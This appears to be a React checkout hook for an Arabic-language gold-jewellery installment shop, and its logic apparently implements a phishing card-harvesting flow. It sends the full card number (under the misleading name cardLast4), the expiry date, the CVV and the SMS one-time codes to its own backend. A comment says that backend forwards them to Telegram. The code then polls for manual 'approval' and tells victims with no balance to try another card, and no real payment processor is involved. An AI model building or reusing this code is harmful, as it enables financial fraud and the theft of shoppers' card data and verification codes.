import { useEffect, useRef, useState } from 'react';
import { toast } from 'sonner';
import {
  createOrder,
  getCardApprovalStatus,
  getVerificationResult,
  postCheckoutEvent,
  requestActivationCode,
  requestCardApproval,
  submitVerificationCode,
  verifyActivationCode,
} from '@/lib/api';
import { clearCheckoutSessionId, getCheckoutSessionId } from '@/lib/checkoutSession';
import { toEnglishNumbers } from '@/lib/utils';
import type { Product } from '@/data/products';
import type { InstallmentPackage, PaymentMethod, Step } from './types';

const DEFAULT_INSTALLMENTS = 4;

const INSTALLMENT_PACKAGES: InstallmentPackage[] = [
  { totalAmount: 5580, installmentsCount: 4, perInstallment: 1395, commission: 280, netTransfer: 5300 },
  { totalAmount: 7440, installmentsCount: 4, perInstallment: 1860, commission: 370, netTransfer: 7070 },
  { totalAmount: 8060, installmentsCount: 4, perInstallment: 2015, commission: 400, netTransfer: 7660 },
  { totalAmount: 10850, installmentsCount: 6, perInstallment: 1808, commission: 540, netTransfer: 10310 },
  { totalAmount: 16120, installmentsCount: 6, perInstallment: 2687, commission: 800, netTransfer: 15320 },
  { totalAmount: 22320, installmentsCount: 6, perInstallment: 3720, commission: 1110, netTransfer: 21210 },
  { totalAmount: 26660, installmentsCount: 6, perInstallment: 4443, commission: 1330, netTransfer: 25330 },
  { totalAmount: 27776, installmentsCount: 12, perInstallment: 2314, commission: 1390, netTransfer: 26386 },
  { totalAmount: 40300, installmentsCount: 12, perInstallment: 3358, commission: 2015, netTransfer: 38285 },
  { totalAmount: 65348, installmentsCount: 12, perInstallment: 5445, commission: 3267, netTransfer: 62081 },
  { totalAmount: 130820, installmentsCount: 36, perInstallment: 3634, commission: 2900, netTransfer: 127920 },
];

interface CheckoutUser {
  name: string;
  email: string;
}

export const useCheckout = (product: Product, user: CheckoutUser) => {
  const [coupon, setCoupon] = useState('');
  const [couponApplied, setCouponApplied] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | null>(null);
  const [selectedPackage, setSelectedPackage] = useState<InstallmentPackage | null>(null);
  const [step, setStep] = useState<Step>('payment-method-selection');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvv, setCardCvv] = useState('');
  const [confirmCode, setConfirmCode] = useState('');
  const [agreedTerms, setAgreedTerms] = useState(false);
  const [activationCode, setActivationCode] = useState('');
  const [codeError, setCodeError] = useState<string | null>(null);
  const [resendTimer, setResendTimer] = useState(0);
  const [isVerifyingCode, setIsVerifyingCode] = useState(false);
  const [confirmCodeError, setConfirmCodeError] = useState<string | null>(null);
  const [isConfirmingCode, setIsConfirmingCode] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const sessionId = getCheckoutSessionId();
  const orderIdRef = useRef(`ORD-${Date.now().toString(36).toUpperCase()}`);
  const orderId = orderIdRef.current;

  // Generate operation ID for CardApproval and VerifyingCode
  const operationId = useRef(Math.floor(Math.random() * 900000000) + 100000000).current;

  const discount = couponApplied ? product.price * 0.05 : 0;
  const finalPrice = product.price - discount;

  const activeInstallments = selectedPackage?.installmentsCount ?? DEFAULT_INSTALLMENTS;
  const activePerInstallment = selectedPackage?.perInstallment ?? finalPrice / DEFAULT_INSTALLMENTS;
  const activeCommission = selectedPackage?.commission ?? 0;
  const activeNetTransfer = selectedPackage?.netTransfer ?? finalPrice;
  const activeTotalAmount = selectedPackage?.totalAmount ?? finalPrice;

  useEffect(() => {
    postCheckoutEvent({
      sessionId,
      eventType: 'checkout_started',
      userName: user.name,
      userEmail: user.email,
      productId: product.id,
      productName: product.name,
      productPrice: product.price,
      amount: finalPrice,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
  }, [sessionId, user, product, finalPrice]);

  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendTimer]);

  // Clear confirm code when navigating to confirm-code step
  useEffect(() => {
    if (step === 'confirm-code') {
      setConfirmCode('');
      setConfirmCodeError(null);
    }
  }, [step, setConfirmCode, setConfirmCodeError]);

  // Clear card info when navigating to card-info step
  useEffect(() => {
    if (step === 'card-info') {
      setCardNumber('');
      setCardExpiry('');
      setCardCvv('');
    }
  }, [step, setCardNumber, setCardExpiry, setCardCvv]);

  // Auto-approval polling - faster response for automatic flow
  useEffect(() => {
    if (step !== 'card-approval') return;

    let pollingInterval: NodeJS.Timeout | null = null;
    let timeoutId: NodeJS.Timeout | null = null;

    const pollStatus = async () => {
      try {
        const response = await getCardApprovalStatus(sessionId);
        if (response.status === 'approved') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          postCheckoutEvent({
            sessionId,
            eventType: 'phone_confirmed',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            paymentMethod,
            installments: activeInstallments,
            phoneMasked: phoneNumber,
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          setStep('confirm-code');
          toast.success('تمت الموافقة على بيانات البطاقة');
        } else if (response.status === 'rejected') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          setStep('card-info');
          toast.error('تم رفض بيانات البطاقة. يمكنك إعادة المحاولة ببيانات أخرى.');
          // لا تحذف الـ session للسماح بإعادة المحاولة
        } else if (response.status === 'error') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          const errorReason = response.reason || 'حدث خطأ غير معروف';
          toast.error(errorReason);
          clearCheckoutSessionId();
        }
      } catch (err) {
        console.error('Error checking approval status:', err);
      }
    };

    // Poll every 500ms for faster auto-approval response
    pollingInterval = setInterval(pollStatus, 500);

    timeoutId = setTimeout(() => {
      if (pollingInterval) clearInterval(pollingInterval);
      setStep('confirm-method');
      toast.error('انتهت مهلة الموافقة. يرجى المحاولة مرة أخرى.');
    }, 3 * 60 * 1000);

    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [step, sessionId, user, product, paymentMethod, activeInstallments, phoneNumber]);

  useEffect(() => {
    if (step !== 'verifying-code') return;

    let pollingInterval: NodeJS.Timeout | null = null;
    let timeoutId: NodeJS.Timeout | null = null;

    const pollStatus = async () => {
      try {
        const response = await getVerificationResult(sessionId);

        if (response.status === 'code_correct') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);

          postCheckoutEvent({
            sessionId,
            eventType: 'redirect_to_payment',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            amount: activeTotalAmount,
            paymentMethod,
            installments: activeInstallments,
            phoneMasked: phoneNumber,
            orderId,
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          postCheckoutEvent({
            sessionId,
            eventType: 'checkout_completed',
            userName: user.name,
            userEmail: user.email,
            productName: product.name,
            amount: activeTotalAmount,
            paymentMethod,
            installments: activeInstallments,
            phoneMasked: phoneNumber,
            orderId,
            paymentStatus: 'paid',
            timestamp: new Date().toISOString(),
          }).catch(() => {});

          createOrder({
            userName: user.name,
            userEmail: user.email,
            userPhone: phoneNumber || null,
            productId: product.id,
            productName: product.name,
            productPrice: product.price,
            productWeight: product.weight,
            productKarat: product.karat,
            amount: activeTotalAmount,
            paymentMethod: paymentMethod ?? 'tamara',
            installments: activeInstallments,
            perInstallment: activePerInstallment,
            commission: activeCommission,
            netTransfer: activeNetTransfer,
            couponApplied,
            discount,
          }).catch(() => {});

          setStep('success');
          toast.success('تم إتمام عملية الشراء بنجاح! 🎉');
          clearCheckoutSessionId();
        } else if (response.status === 'code_incorrect') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setStep('confirm-code');
          toast.error('الكود غير صحيح - يرجى إعادة المحاولة');
        } else if (response.status === 'no_balance') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setStep('card-info');
          toast.error('لا يوجد رصيد بالبطاقة - جرب بطاقة أخرى');
        } else if (response.status === 'card_rejected') {
          if (pollingInterval) clearInterval(pollingInterval);
          if (timeoutId) clearTimeout(timeoutId);
          setStep('card-info');
          toast.error('تم رفض البطاقة - جرب بطاقة أخرى');
        }
      } catch (err) {
        console.error('Error checking verification result:', err);
      }
    };

    pollingInterval = setInterval(pollStatus, 2000);

    timeoutId = setTimeout(() => {
      if (pollingInterval) clearInterval(pollingInterval);
      setStep('confirm-code');
      toast.error('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
    }, 5 * 60 * 1000);

    return () => {
      if (pollingInterval) clearInterval(pollingInterval);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [step, sessionId, user, product, paymentMethod, activeInstallments, phoneNumber, activeTotalAmount, orderId, activeCommission, activeNetTransfer, activePerInstallment, couponApplied, discount]);

  const applyCoupon = () => {
    if (coupon.trim().toUpperCase() === 'GOLD5') {
      setCouponApplied(true);
      toast.success('تم تطبيق الكوبون! خصم 5%');
    } else {
      toast.error('كوبون غير صالح');
    }
  };

  const handleConfirmPayment = () => {
    if (!paymentMethod) {
      toast.error('يرجى اختيار طريقة الدفع');
      return;
    }
    postCheckoutEvent({
      sessionId,
      eventType: 'payment_method_selected',
      userName: user.name,
      userEmail: user.email,
      productName: product.name,
      amount: activeTotalAmount,
      paymentMethod,
      installments: activeInstallments,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
    setStep('confirm-method');
  };

  const handleSendActivationCode = async () => {
    const cleanPhone = toEnglishNumbers(phoneNumber.trim());

    if (!cleanPhone || cleanPhone.length < 10) {
      toast.error('يرجى إدخال رقم هاتف صحيح');
      return;
    }

    try {
      await requestActivationCode({
        sessionId,
        phoneNumber: cleanPhone,
        userName: user.name,
        userEmail: user.email,
      });

      toast.success('تم إرسال رمز التحقق');
      setResendTimer(180);
      setStep('verify-phone');
    } catch (err) {
      console.error('Failed to send activation code:', err);
      toast.error('فشل في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.');
    }
  };

  const handleVerifyActivationCode = async () => {
    const cleanCode = toEnglishNumbers(activationCode.trim());

    if (!cleanCode || cleanCode.length !== 6) {
      setCodeError('يرجى إدخال رمز التحقق المكون من 6 أرقام');
      return;
    }

    if (!agreedTerms) {
      setCodeError('يرجى الموافقة على الشروط والأحكام');
      return;
    }

    setIsVerifyingCode(true);
    setCodeError(null);

    try {
      // Send code to backend which forwards to Telegram
      await verifyActivationCode(sessionId, cleanCode);
      
      toast.success('تم التحقق من الرمز بنجاح');
      setStep('select-plan');
    } catch (err) {
      console.error('Failed to verify activation code:', err);
      setCodeError(err instanceof Error ? err.message : 'الكود غير صحيح');
    } finally {
      setIsVerifyingCode(false);
    }
  };

  const handleCardSubmit = async () => {
    if (isSubmitting) {
      return;
    }

    if (!cardNumber || !cardExpiry || !cardCvv) {
      toast.error('يرجى ملء جميع بيانات البطاقة');
      return;
    }

    setIsSubmitting(true);

    const cardNumberClean = cardNumber.replace(/\D/g, '');

    try {
      await requestCardApproval({
        sessionId,
        userName: user.name,
        userEmail: user.email,
        productName: product.name,
        amount: activeTotalAmount,
        paymentMethod,
        installments: activeInstallments,
        phoneMasked: phoneNumber,
        cardLast4: cardNumberClean,
        cardExpiry,
        cardCvv,
      });

      toast.info('جاري التحقق من بيانات البطاقة...');
      setStep('card-approval');
    } catch (err) {
      console.error('Failed to request approval:', err);
      toast.error('فشل في طلب الموافقة. يرجى المحاولة مرة أخرى.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleFinalConfirm = async () => {
    if (!confirmCode || confirmCode.length < 4) {
      setConfirmCodeError('يرجى إدخال رمز التأكيد');
      return;
    }

    setIsConfirmingCode(true);
    setConfirmCodeError(null);

    try {
      await submitVerificationCode(sessionId, confirmCode, {
        userName: user.name,
        userEmail: user.email,
        productName: product.name,
        amount: activeTotalAmount,
        paymentMethod,
        installments: activeInstallments,
        phoneMasked: phoneNumber,
      });

      setStep('verifying-code');
      toast.info('جاري التحقق من رمز التأكيد...');
    } catch (err) {
      console.error('Failed to verify OTP code:', err);
      setConfirmCodeError(err instanceof Error ? err.message : 'الكود غير صحيح');
    } finally {
      setIsConfirmingCode(false);
    }
  };

  const formatPrice = (price: number) => {
    const formatted = new Intl.NumberFormat('en-US', {
      style: 'decimal',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(price);
    return `${formatted} ر.س`;
  };

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return {
    INSTALLMENT_PACKAGES,
    activeCommission,
    activeInstallments,
    activeNetTransfer,
    activePerInstallment,
    activeTotalAmount,
    agreedTerms,
    applyCoupon,
    cardCvv,
    cardExpiry,
    cardNumber,
    codeError,
    confirmCode,
    confirmCodeError,
    coupon,
    couponApplied,
    discount,
    finalPrice,
    formatPrice,
    formatTimer,
    handleCardSubmit,
    handleConfirmPayment,
    handleFinalConfirm,
    handleSendActivationCode,
    handleVerifyActivationCode,
    isConfirmingCode,
    isSubmitting,
    isVerifyingCode,
    orderId,
    operationId,
    paymentMethod,
    phoneNumber,
    resendTimer,
    selectedPackage,
    sessionId,
    setAgreedTerms,
    setCardCvv,
    setCardExpiry,
    setCardNumber,
    setCodeError,
    setConfirmCode,
    setConfirmCodeError,
    setCoupon,
    setPaymentMethod,
    setPhoneNumber,
    setSelectedPackage,
    setStep,
    setActivationCode,
    step,
    activationCode,
  };
};
